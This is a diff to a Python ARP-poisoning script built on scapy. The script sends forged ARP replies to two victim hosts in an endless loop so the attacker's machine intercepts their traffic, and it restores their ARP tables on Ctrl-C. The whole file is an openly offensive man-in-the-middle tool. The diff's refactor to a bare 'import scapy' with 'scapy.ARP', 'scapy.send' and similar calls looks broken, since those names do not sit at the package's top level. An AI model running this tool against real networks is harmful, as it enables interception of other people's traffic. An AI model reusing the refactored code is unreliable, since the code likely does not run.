@@ -1,7 +1,5 @@
 # Packages
-from scapy.all import ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap, getmacbyip
-import sys
-import time
+import scapy, sys, time
 
 # Constants
 DIVIDER = '=' * 60
@@ -17,12 +15,12 @@ class ARPPoisoning():
         self.interface = interface
 
         # Assign default scapy interface
-        conf.iface = interface
+        scapy.conf.iface = interface
 
         # Assign macAddresses
-        self.victimOneMac = getmacbyip(victimOneIP)
-        self.victimTwoMac = getmacbyip(victimTwoIP)
-        self.deviceMac = get_if_hwaddr(interface)
+        self.victimOneMac = scapy.getmacbyip(victimOneIP)
+        self.victimTwoMac = scapy.getmacbyip(victimTwoIP)
+        self.deviceMac = scapy.get_if_hwaddr(interface)
 
     # Returns interactive prompt string
     def __repr__(self):
@@ -45,13 +43,13 @@ class ARPPoisoning():
 
         # Setup packets
         # ARP Poisoning packet for victim one
-        victimOnePoisonPacket = ARP(hwsrc = self.deviceMac,
+        victimOnePoisonPacket = scapy.ARP(hwsrc = self.deviceMac,
                            psrc = self.victimTwoIP,
                            pdst = self.victimOneIP, 
                            hwdst = self.victimOneMac)
 
         # ARP Poisoning packet for victim two
-        victimTwoPoisonPacket = ARP(hwsrc = self.deviceMac,
+        victimTwoPoisonPacket = scapy.ARP(hwsrc = self.deviceMac,
                             psrc = self.victimOneIP,
                             pdst = self.victimTwoIP,
                             hwdst = self.victimTwoMac)
@@ -59,22 +57,24 @@ class ARPPoisoning():
         # Infinitely poisons the victim and the spoofed device
         while True:
             try: # Send poison packets
-                send(victimOnePoisonPacket)
-                send(victimTwoPoisonPacket)
+                scapy.send(victimOnePoisonPacket)
+                scapy.send(victimTwoPoisonPacket)
                 time.sleep(POISON_BREAK)
             except KeyboardInterrupt: # CTRL-C was pressed
                 self.clean() # Cleaning ARP tables of the victims
-                break
+                break # Stop the poisoning-loop
 
     # Clean ARP tables of the victims
     def clean(self):
-        send(ARP(
+        # Clean victim one's ARP Table
+        scapy.send(scapy.ARP(
             op=2,
             psrc=self.victimTwoIP,
             hwsrc=self.victimTwoMac,
             pdst=self.victimOneIP,
             hwdst=self.victimOneMac), count=5)
-        send(ARP(
+        # Clean victim two's ARP Table
+        scapy.send(scapy.ARP(
             op=2,
             psrc=self.victimOneIP,
             hwsrc=self.victimOneMac,
@@ -84,7 +84,7 @@ class ARPPoisoning():
 # Starts the program
 if __name__ == '__main__':
     # Disables verbosity (command line) mode
-    conf.verb = 0
+    scapy.conf.verb = 0
 
     # Assign parameters to variables
     victimOneIP = sys.argv[1]
